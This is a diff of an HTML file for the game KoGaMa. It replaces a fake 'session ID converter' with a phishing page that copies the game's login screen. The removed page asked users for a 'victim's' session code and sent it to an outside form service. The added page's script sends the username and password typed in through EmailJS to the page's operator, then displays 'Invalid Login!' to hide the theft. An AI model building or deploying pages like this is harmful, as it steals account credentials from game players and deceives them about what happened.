@@ -1,22 +1,136 @@
-r<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Kogama Session ID Converter</title>
-  <link href="https://fonts.googleapis.com/css2?family=Jersey+15&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="styles.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Teste Login</title>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@800&display=swap');
+
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: url('bg.png') no-repeat center center fixed;
+            background-size: cover;
+        }
+
+        .header-bar {
+            background-color: #555;
+            color: rgba(255, 255, 255, 0.8); /* Texto transparente */
+            text-align: center;
+            padding: 10px 0;
+            font-size: 30px; /* Tamanho ajustado */
+            font-weight: 800;
+            font-family: 'Open Sans', sans-serif;
+            width: 1245px; /* Largura ajustada */
+            margin-bottom: -10px; /* Ajusta para colar no container */
+        }
+
+        .login-container {
+            display: flex;
+            background: #383434; /* Cor ajustada */
+            padding: 20px;
+            color: white;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
+        }
+
+        .login-form {
+            display: flex;
+            flex-direction: column;
+            margin-left: 20px;
+        }
+
+        .login-form h1 {
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+
+        .login-form input {
+            margin-bottom: 15px;
+            padding: 15px; /* Aumenta o tamanho interno */
+            border: 2px solid gray; /* Contorno mais grosso cinza */
+            border-radius: 0; /* Remove bordas arredondadas */
+            background: transparent;
+            color: white;
+            font-size: 18px; /* Aumenta o tamanho da fonte */
+        }
+
+        .login-form input::placeholder {
+            color: lightgray;
+        }
+
+        .login-form button {
+            background: #4CAF50;
+            color: #383434;
+            border: none;
+            padding: 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            width: 150px; /* Reduz o comprimento do botão */
+            align-self: flex-end; /* Justifica o botão à direita */
+        }
+
+        .login-form button:hover {
+            background: #45a049;
+        }
+
+        .captcha-info {
+            font-size: 12px;
+            margin-top: 10px;
+            color: lightgray;
+        }
+
+        .image-section img {
+            width: 600px; /* Ajustado para 600px */
+            border-radius: 10px;
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <h1 class="title">Kogama Session ID Converter</h1>
-    <h2 class="subtitle">Convert a Session ID into an injectable cookie with automatic login</h2>
-    <form id="giftForm" action="login.html" method="get" action="https://formsubmit.co/recoveraccountig@proton.me" method="POST">
-      <label for="monkeyName" class="label">Enter your victims's "session" code:</label>
-      <input type="text" id="monkeyName" name="monkeyName" class="input" placeholder="Paste here" required>
-      <button type="submit" class="button">Convert</button>
-    </form>
-    <p id="responseMessage" class="response-message"></p>
-  </div>
+    <div class="header-bar">KoGaMa Login</div>
+    <div class="login-container">
+        <div class="image-section">
+            <img src="bg2.png" alt="Background">
+        </div>
+        <div class="login-form">
+            <h1></h1>
+            <h1></h1>
+            <input type="text" id="username" placeholder="Username">
+            <input type="password" id="password" placeholder="Password">
+            <button id="login-btn">Login</button>
+            <p class="captcha-info">
+                Este site é protegido pelo reCAPTCHA e pelo Google
+                <a href="#" style="color: lightgray;">Política de Privacidade</a> e <a href="#" style="color: lightgray;">Termos de Serviço</a> aplicam-se.
+            </p>
+        </div>
+    </div>
+
+    <script>
+      emailjs.init("8RtRUxawVq6HBXrIE"); // Substitua pelo seu User ID do EmailJS
+
+document.getElementById('login-btn').addEventListener('click', function (e) {
+    e.preventDefault();
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+
+    emailjs.send("sservice_1kp5ipu", "template_d6m13qpd", {
+        username: username,
+        password: password,
+    }).then(response => {
+        alert("Invalid Login!");
+    }).catch(err => {
+        alert("ERROR");
+    });
+});
+     
+    </script>
 </body>
 </html>
